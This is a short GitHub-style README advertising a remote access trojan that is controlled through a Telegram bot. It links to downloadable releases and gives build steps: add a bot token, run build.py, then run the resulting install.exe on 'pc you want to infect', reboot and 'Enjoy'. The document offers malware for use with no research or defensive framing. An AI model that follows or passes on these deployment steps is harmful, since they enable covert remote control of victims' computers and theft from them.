# RAT / Trojan Remote Access Token
#### Remote Access carried out from Telegram Bot
##### [Download](https://github.com/EpixerSX/epixersx.trojan-rat/releases)

## How to generate
- [Create Telegram Bot](https://youtu.be/vZtm1wuA2yc?t=32), To get API Token
- Write you Bot Token into token file RATBuilder/token
#### Example: 
```'you_token'```
##### If you want to create some bots
```
'you_token1'
'you_token2'
...
```
- Run ```build.py```
- Check RATBuilder/builds/
- Then run install.exe on pc you want to infect 
- Reboot PC
- Enjoy
